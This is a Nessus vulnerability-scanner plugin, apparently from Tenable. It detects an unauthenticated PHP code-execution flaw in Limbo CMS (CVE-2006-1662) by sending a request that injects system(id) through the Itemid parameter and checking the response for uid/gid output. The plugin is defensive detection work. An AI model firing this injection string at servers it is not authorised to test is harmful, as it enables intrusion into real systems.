#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20994);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2006-1662");
  script_bugtraq_id(16902);
  script_osvdb_id(23699);

  script_name(english:"Limbo CMS index.php Itemid Parameter Arbitrary Command Execution");
  script_summary(english:"Injects arbitrary PHP code via Itemid parameter in Limbo CMS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
an arbitrary code execution vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Limbo CMS, a content-management system
written in PHP. 

The installed version of Limbo fails to sanitize input to the 'Itemid'
parameter before using it as part of a search string in an 'eval()'
statement in the 'classes/adodbt/read_table.php' script.  Regardless
of PHP's 'register_globals' and 'magic_quotes_gpc' settings, an
unauthenticated attacker can leverage this issue to execute arbitrary
PHP code on the remote host subject to the privileges of the web
server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/426428/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/429946/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8681f194" );
 script_set_attribute(attribute:"solution", value:
"Apply the Limbo security patch update from 2006-03-09." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/03/03");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/02/28");
 script_cvs_date("$Date: 2011/03/15 19:22:15 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2011 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


if (thorough_tests) extra_dirs = make_list ("/limbo");
else extra_dirs = NULL;

http_check_remote_code(
  extra_dirs:extra_dirs,
  check_request:string("/index.php?option=frontpage&Itemid=2|system(id)|", unixtime()),
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  port:port
);
